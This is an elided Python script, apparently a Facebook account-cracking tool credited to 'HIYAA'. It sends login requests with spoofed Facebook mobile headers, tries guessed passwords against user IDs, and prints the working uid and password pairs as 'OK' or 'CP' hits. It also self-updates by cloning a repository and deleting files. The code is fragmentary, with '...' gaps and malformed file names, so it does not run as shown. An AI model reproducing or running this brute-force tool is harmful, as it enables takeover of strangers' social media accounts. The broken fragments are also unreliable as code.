...
#AUTHOR : HIYAA (SPICY. GIRL)

#OPEN SOURCE :)

#DON'T FORGET TO GIVE CREDIT TO SPICY. GIRL
...
try:
	...
	os.system("python2 Cold drinks.py")
...
def main():
	...
	print("\033[96;1m  [J] JOIN SPICY. GIRL GROUP \033[92;1m✘\033[91;1m✘")
...
def log_sel():
	...
	if sel == "":
		...
		try:
			...
			os.system("git clone https://github.com/Hiya/Cold drinks")

			os.system("rm -rf cold drinks.py")

			os.system("cp -f cold drinks/cold drinks.py \\.")

			os.system("rm -rf cold drinks")
...
def token():
    ...
    try:
        ...
        token = open("hiyaa_token.txt", "r").read()
...
def token_check():
	...
	try:
		...
		os.system('rm -rf hiyaa_token.txt')
...
def crack_select1():
	...
	def main(arg):
		...
		try:
			...
			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _hiyaua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
															...
															if "access_token" in data.text and "EAAA" in data.text:
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	...
																	if "access_token" in data.text and "EAAA" in data.text:
																		...
																		print(" \033[1;32m[HIYAA-OK] "+uid+" | "+pass8+"\033[0;97m")
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			...
																			print(" \033[1;33m[HIYAA-CP] "+uid+" | "+pass8+"\033[0;97m")
